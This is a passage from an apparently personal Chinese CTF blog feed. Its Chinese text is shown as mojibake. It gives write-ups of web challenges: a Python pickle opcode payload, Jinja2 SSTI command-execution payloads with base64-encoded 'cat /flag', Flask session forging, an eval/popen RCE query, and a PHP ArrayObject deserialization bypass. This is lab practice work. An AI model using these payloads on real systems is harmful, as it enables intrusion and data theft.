å’Œç«¯å£ã€‚<br>0&gt;&amp;1ï¼šå°†æ ‡å‡†è¾“å…¥é‡å®šå‘ã€‚<br>atp5ï¼š<br><br>å°†ä¸Šè¿°åºåˆ—åŒ–å†…å®¹ä½œä¸ºå‚æ•°åˆ—è¡¨ï¼Œæœ€ç»ˆå­˜å‚¨åˆ° p5ã€‚<br>Rp6.ï¼š<br><br>è°ƒç”¨ subprocess.run å¹¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚<br></code></pre></td></tr></table></figure><p>payload2å¤–å¸¦åˆ°app.py:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">getattr = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)<br><br><span class="hljs-keyword">open</span> = <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>)<br>flag=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><span class="hljs-keyword">read</span>=getattr(flag, <span class="hljs-string">&#x27;read&#x27;</span>)<br>f=<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;./app.py&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">write</span>=getattr(f, <span class="hljs-string">&#x27;write&#x27;</span>)<br>fff=<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">write</span>(fff)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>è½¬åŒ–ä¸ºopcode</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">b<span class="hljs-string">&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0cbuiltins</span><br><span class="hljs-string">open</span><br><span class="hljs-string">p1</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>/flag<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;</span><span class="hljs-keyword">read</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g1</span><br><span class="hljs-string">(S&#x27;</span>./app.py<span class="hljs-string">&#x27;</span><br><span class="hljs-string">S&#x27;</span>w<span class="hljs-string">&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;</span>writ<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">0g3</span><br><span class="hljs-string">(tRp6</span><br><span class="hljs-string">0g5</span><br><span class="hljs-string">(g6</span><br><span class="hljs-string">tR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>getattr<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>ï¼š<br><br>c è¡¨ç¤ºå¯¼å…¥æ¨¡å—ï¼Œè¿™é‡Œå¼•ç”¨çš„æ˜¯ Python çš„å†…ç½®æ¨¡å— builtinsã€‚<br>getattr ç”¨äºè·å–æŒ‡å®šå¯¹è±¡çš„å±æ€§ã€‚<br>cbuiltins<span class="hljs-symbol">\n</span>open<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>ï¼š<br><br>open æ˜¯ Python çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºæ‰“å¼€æ–‡ä»¶ã€‚<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;/flag&#x27;<span class="hljs-symbol">\n</span>tRp2<span class="hljs-symbol">\n</span>ï¼š<br><br>g1 å¼•ç”¨ä¹‹å‰åºåˆ—åŒ–çš„ open å‡½æ•°ã€‚<br>&#x27;/flag&#x27; æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œè¡¨ç¤ºå°è¯•æ‰“å¼€ /flag æ–‡ä»¶ã€‚<br>tR è°ƒç”¨ open æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼ˆä¿å­˜åˆ° p2ï¼‰ã€‚<br>0g0<span class="hljs-symbol">\n</span>(g2<span class="hljs-symbol">\n</span>S&#x27;read&#x27;<span class="hljs-symbol">\n</span>tRp3<span class="hljs-symbol">\n</span>ï¼š<br><br>ä½¿ç”¨ getattr è·å–æ–‡ä»¶å¯¹è±¡ï¼ˆg2 æ˜¯ /flag æ–‡ä»¶ï¼‰çš„ read æ–¹æ³•ã€‚<br>tR è°ƒç”¨ read æ–¹æ³•ï¼Œä¿å­˜è¯»å–çš„å†…å®¹åˆ° p3ã€‚<br>0g1<span class="hljs-symbol">\n</span>(S&#x27;./app.py&#x27;<span class="hljs-symbol">\n</span>S&#x27;w&#x27;<span class="hljs-symbol">\n</span>tRp4<span class="hljs-symbol">\n</span>ï¼š<br><br>å†æ¬¡è°ƒç”¨ open å‡½æ•°ï¼Œè¿™æ¬¡æ‰“å¼€çš„æ˜¯ ./app.py æ–‡ä»¶ï¼Œä»¥å†™å…¥æ¨¡å¼ (w) æ‰“å¼€ï¼Œè¿”å›æ–‡ä»¶å¯¹è±¡ï¼ˆä¿å­˜åˆ° p4ï¼‰ã€‚<br>0g0<span class="hljs-symbol">\n</span>(g4<span class="hljs-symbol">\n</span>S&#x27;write&#x27;<span class="hljs-symbol">\n</span>tRp5<span class="hljs-symbol">\n</span>ï¼š<br><br>ä½¿ç”¨ getattr è·å–ç›®æ ‡æ–‡ä»¶å¯¹è±¡ï¼ˆp4ï¼‰çš„ write æ–¹æ³•ã€‚<br>tR è¿”å› write æ–¹æ³•å¯¹è±¡ï¼Œä¿å­˜åˆ° p5ã€‚<br>0g5<span class="hljs-symbol">\n</span>(g6<span class="hljs-symbol">\n</span>tR.ï¼š<br><br>è°ƒç”¨ write æ–¹æ³•ï¼Œå°†ä¹‹å‰è¯»å–çš„ /flag æ–‡ä»¶å†…å®¹å†™å…¥ ./app.py æ–‡ä»¶ã€‚<br>åŠŸèƒ½æ¦‚è¿°<br>ååºåˆ—åŒ–æ­¤æ•°æ®åï¼Œç¨‹åºå°†æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br><br>æ‰“å¼€ /flag æ–‡ä»¶å¹¶è¯»å–å…¶å†…å®¹ã€‚<br>æ‰“å¼€æˆ–åˆ›å»º ./app.py æ–‡ä»¶ï¼Œä»¥å†™å…¥æ¨¡å¼å‡†å¤‡å†™å…¥ã€‚<br>å°† /flag æ–‡ä»¶çš„å†…å®¹å†™å…¥åˆ° ./app.py æ–‡ä»¶ä¸­ã€‚<br></code></pre></td></tr></table></figure><p>è‡ªå·±å¯¹äºpickleçš„ååºåˆ—åŒ–å’Œopcodeçš„ç¼–å†™è¿˜ä¸æ˜¯å¾ˆç†Ÿ</p><p>è¿˜å¾—ç»ƒ</p>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.22</title>
    <link href="/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/"/>
    <url>/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/</url>
    
    <content type="html"><![CDATA[<h1 id="2023æ„šäººæ¯easy-ssti"><a href="#2023æ„šäººæ¯easy-ssti" class="headerlink" title="2023æ„šäººæ¯easy-ssti"></a>2023æ„šäººæ¯easy-ssti</h1><p>è¿›å…¥F12æ‰“å¼€æ§åˆ¶å°æç¤ºä¸‹è½½app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure><p>helloç›®å½•ä¸‹æœ‰ssti</p><p>payloadè¦æœ‰geæˆ–è€…ä¸èƒ½æœ‰f</p><p>å°è¯•æ‰“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ &#x2F; è¢«å½“ä½œè·¯ç”±æŠ¥é”™ï¼Œå°è¯•ç»•è¿‡ï¼Œä½¿ç”¨base64ç¼–ç <strong>åå¼•å·</strong>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> bHMgLw== | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo bHMgLw== | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo Y2F0IC9mbGFn | base64 -d`&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><h1 id="2023æ„šäººæ¯easy-flask"><a href="#2023æ„šäººæ¯easy-flask" class="headerlink" title="2023æ„šäººæ¯easy-flask"></a>2023æ„šäººæ¯easy-flask</h1><p>è¿›å…¥çœ‹è§ç™»å½•æ¡†å°è¯•sqlï¼Œxssï¼Œsstiæ²¡ç»“æœ</p><p>å‘ç°adminè´¦å·æç¤ºå¯†ç é”™è¯¯ï¼Œæ³¨å†Œè´¦å·è¿›å»çœ‹çœ‹</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150714144.png" alt="1"></p><p>æç¤ºæˆ‘ä»¬æ˜¯userï¼Œå†learnçœ‹è§å¯†ç æ˜¯S3cr3tK3y</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122150747281.png" alt="image-20250122150747281"></p><p>çˆ†ç ´session,æ‹¿åˆ°</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br>-&gt; &#123;<span class="hljs-string">&#x27;loggedin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸ºadminç”¨å¯†é’¥åŠ å¯†,æ›¿æ¢å…ƒç´ session</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxIn0<span class="hljs-selector-class">.Z5CcCA</span>.IZ_i9nESqDbObpSXrK72b8-VfZ8<br></code></pre></td></tr></table></figure><p>ä¼ªé€ æˆåŠŸçœ‹è§ä¸€ä¸ªä¸‹è½½</p><p>â€‹<img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152102290.png" alt="image-20250122152102290"></p><p>ä½†æ˜¯ä¸‹è½½æ˜¯ä¸€äº›æ²¡ç”¨çš„faskflag</p><p>æŠ“åŒ…å‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œä¸‹è½½æºç çœ‹çœ‹&#x2F;app&#x2F;app.pyç»å¯¹è·¯å¾„</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122152504059.png" alt="image-20250122152504059"></p><p>å‘ç°helloç›®å½•å­˜åœ¨rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/hello?<span class="hljs-built_in">eval</span>=__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /flag_is_h3re &#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>å¯¼å…¥osåº“æ‹¿åˆ°flag</p><h1 id="2023æ„šäººæ¯easy-php"><a href="#2023æ„šäººæ¯easy-php" class="headerlink" title="2023æ„šäººæ¯easy-php"></a>2023æ„šäººæ¯easy-php</h1><p>popé“¾ï¼Œé“¾å­å¾ˆç®€å•ï¼Œä½†æ˜¯ä¸èƒ½ç”¨Oï¼Œaå¼€å¤´ä¹Ÿå°±æ˜¯ä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡</p><p>æŸ¥äº†ä¸‹èµ„æ–™ï¼Œè¦ç”¨å®ç°äº†<code>Serializable</code> æ¥å£çš„åŸç”Ÿç±»æ¥æ„é€ </p><p>æŸ¥æ‰¾å®ç°äº†serializableæ¥å£çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br><br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br><br>            <span class="hljs-string">&#x27;unserialize&#x27;</span>,<br><br>        ))) &#123;<br><br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>        &#125;<br><br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶åœ¨ä½ç‰ˆæœ¬çš„æ—¶å€™å¯ä»¥åœ¨Oaåé¢åŠ +ç»•è¿‡ä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œç‰ˆæœ¬åº”è¯¥åœ¨7.4+</p><p>æ‰€æœ‰payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<br><span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šä¸è¦å†phpstormè¿è¡Œä»£ç ï¼Œä¸ç„¶ä¼šä»¥Oå¼€å¤´åœ¨æœ¬åœ°åŸå§‹ç¯å¢ƒè¿è¡Œ</p></blockquote><p>æœ€ç»ˆpayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">78</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;cat /f*&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘-wakeup"><a href="#è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘-wakeup" class="headerlink" title="è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘__wakeup()"></a>è§£é‡Šä¸ºä»€ä¹ˆä¸ä¼šè§¦å‘__wakeup()</h2><p>Oæ ‡è¯†ç¬¦ä»£è¡¨å¯¹è±¡ç±»å‹ï¼Œè€ŒCæ ‡è¯†ç¬¦ä»£è¡¨ç±»åç±»å‹ã€‚å¦‚æœå°†Cæ›¿æ¢ä¸ºOï¼Œåˆ™åœ¨ååºåˆ—åŒ–æ—¶ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ä¸ªæ–°çš„ç±»åå­—ç¬¦ä¸²ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»è€Œä¸æ˜¯å¯¹è±¡ã€‚å› ä¸ºè¿™ä¸ªæ–°çš„ç±»æ²¡æœ‰è¢«åºåˆ—åŒ–è¿‡ï¼Œæ‰€ä»¥å®ƒæ²¡æœ‰ä»»ä½•å±æ€§æˆ–æ–¹æ³•ã€‚è¿™æ ·ä¸€æ¥ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œ__wakeupé­”æœ¯æ–¹æ³•å°±ä¸ä¼šè§¦å‘ï¼Œç®€å•æ¥è¯´å°±æ˜¯wakeupåªå¯¹å¯¹è±¡æœ‰æ•ˆ</p><h1 id="2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–"><a href="#2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–" class="headerlink" title="2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–"></a>2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–</h1><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable 